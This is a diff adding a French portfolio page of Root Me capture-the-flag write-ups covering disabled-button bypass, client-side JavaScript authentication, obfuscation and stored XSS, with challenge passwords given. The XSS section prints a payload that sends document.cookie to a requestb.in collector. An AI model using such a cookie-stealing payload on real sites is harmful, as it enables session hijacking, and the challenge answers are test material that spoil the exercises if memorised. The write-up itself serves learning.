@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>À propos - Portfolio Théo OGER</title>
+  <link rel="stylesheet" href="../../css/root-me_pages.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<script src="../../js/veille.js"></script>
+
+<body>
+
+  <!-- Header -->
+  <header>
+    <nav>
+      <ul>
+        <li><a href="../Acceuil.html">Accueil</a></li>
+        <li><a href="../apropos.html">À propos</a></li>
+        <li><a href="../projets.html">Projets</a></li>
+        <li><a href="../veille.html">Veille</a></li>
+        <li><a href="root-me.html" class="active">Root Me</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main class="veille-container">
+
+    <section class="accordion">
+
+      <!-- HTML - Boutons Désactivés -->
+      <button class="accordion-toggle">HTML - Boutons Désactivés</button>
+      <div class="accordion-content">
+  <p>Dans ce type de challenge, la page HTML contient un formulaire avec un bouton marqué disabled. Cet attribut empêche l’utilisateur de cliquer et d’envoyer le formulaire directement.</p>
+<p>Pour contourner cela, on utilise les outils de développement du navigateur (F12). Dans l’onglet Inspecteur, on repère le bouton et on supprime l’attribut disabled.</p>
+</div>
+
+<!-- Javascript - Authentification -->
+      <button class="accordion-toggle">Javascript - Authentification</button>
+      <div class="accordion-content">
+  <p>Le challenge consiste à analyser le fonctionnement d’une page web qui gère une authentification côté client.</p>
+<p>En ouvrant la page et en lançant la console web (F12), on observe les requêtes réseau. Lors du rafraîchissement, la page charge un fichier JavaScript externe :</p>
+<p>http://challenge01.root-me.org/web-client/ch9/login.js</p>
+<p>En visitant directement cette URL, on peut consulter le contenu du script. Celui-ci contient une condition explicite :</p>
+<p>if (pseudo=="4dm1n" && password=="sh.org")</p>
+</div>
+
+<!-- Javascript - Authentification 2 -->
+      <button class="accordion-toggle">Javascript - Authentification 2</button>
+      <div class="accordion-content">
+  <p>Dans ce challenge, la page HTML appelle un fichier JavaScript externe qui contient la logique d’authentification. En ouvrant les outils de développement (F12) et en utilisant le débogueur ou l’onglet Sources, on peut observer le contenu du script chargé.</p>
+<p>On y trouve une structure de type tableau :</p>
+<p>javascript</p>
+<p>TheLists[0] = "CACHÉ:HIDDEN";</p>
+<p>...</p>
+<p>var TheSplit = TheLists[i].split(":");</p>
+<p>var TheUsername = TheSplit[0];</p>
+<p>var ThePassword = TheSplit[1];</p>
+<p>Le code montre que chaque entrée du tableau TheLists contient une paire username:password. La fonction découpe la chaîne avec split(":") pour séparer le nom d’utilisateur et le mot de passe.</p>
+<p>Ainsi, en lisant directement le contenu du tableau, on récupère les identifiants nécessaires. Dans l’exemple, l’utilisateur est CACHÉ et le mot de passe est HIDDEN.</p>
+</div>
+
+<!-- Javascript - Source -->
+      <button class="accordion-toggle">Javascript - Source</button>
+      <div class="accordion-content">
+  <p>Dans ce challenge, l’authentification est gérée directement dans le code source de la page. En ouvrant le fichier HTML ou en inspectant le JavaScript chargé par la page, on tombe sur une condition explicite :</p>
+<p>if ( pass == "123456azerty" )</p>
+</div>
+
+<!-- Javascript - Obfuscation 1 -->
+      <button class="accordion-toggle">Javascript - Obfuscation 1</button>
+      <div class="accordion-content">
+  <p>Dans ce challenge, le code JavaScript chargé par la page est volontairement obfusqué afin de rendre sa lecture difficile. L’objectif est de retrouver la logique réelle du script pour identifier le mot de passe ou l’indice caché.</p>
+<p>Dans ce cas, l’outil utilisé pour désobfusquer le code est ChatGPT. Le mot de passe apparaît alors directement dans la logique du code.</p>
+</div>
+
+<!-- Javascript - Obfuscation 2 -->
+      <button class="accordion-toggle">Javascript - Obfuscation 2</button>
+      <div class="accordion-content">
+  <p>Ce challenge reprend le même principe que le précédent. Le code JavaScript chargé par la page est volontairement obfusqué afin de masquer la logique d’authentification.</p>
+<p>Utilisation de ChatGPT.</p>
+</div>
+
+<!-- Javascript - Obfuscation 3 -->
+      <button class="accordion-toggle">Javascript - Obfuscation 3</button>
+      <div class="accordion-content">
+  <p>Ce challenge reprend le même principe que le précédent. Le code JavaScript chargé par la page est volontairement obfusqué afin de masquer la logique d’authentification.</p>
+<p>Utilisation de ChatGPT.</p>
+</div>
+
+<!-- Javascript - Native Code -->
+      <button class="accordion-toggle">Javascript - Native Code</button>
+      <div class="accordion-content">
+  <p>J’ai simplement pris le script et utiliser la console en remplaçant les parenthèses par .tostring afin d’afficher ma fonction.</p>
+</div>
+
+<!-- XSS - Stockée 1 -->
+      <button class="accordion-toggle">XSS - Stockée 1</button>
+      <div class="accordion-content">
+  <p>Dans ce challenge, on commence par tester la vulnérabilité avec une injection simple :</p>
+<p>< script>alert (1)< /script ></p>
+<p>Le pop‑up confirme que le site est vulnérable à une XSS stockée.</p>
+<p>On peut ensuite injecter un script plus élaboré :</p>
+<p>< script ></p>
+<p>document.write('< imgsrc= "https://requestb.in/xxxxx?cookie=' + document.cookie + '">admin< /img >');</p>
+<p>< /script ></p>
+<p>Explication de la commande :</p>
+      <p>- < script > ... < /script > : balise qui permet d’exécuter du JavaScript directement dans la page.</p>
+      <p>- document.write(...) : insère dynamiquement du contenu HTML dans la page. Ici, on génère une balise < img >.</p>
+      <p>- < imgsrc="..." > : l’image n’a pas besoin d’exister, l’important est que le navigateur fasse une requête HTTP vers l’URL indiquée.</p>
+      <p>- https://requestb.in/xxxxx?cookie= : URL vers un service de collecte de requêtes. On y ajoute en paramètre la valeur des cookies.</p>
+      <p>- document.cookie : récupère les cookies de la page, souvent utilisés pour l’authentification.</p>
+      <p>- Résultat : lorsque la page est affichée, le navigateur envoie une requête vers requestb.in contenant les cookies de l’utilisateur.</p>
+<p>J’ai utilisé le site requestbin afin d’éviter de build un serveur.</p>
+</div>
+
+
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2025 Théo OGER — Tous droits réservés</p>
+  </footer>
+
+</body>
+</html>
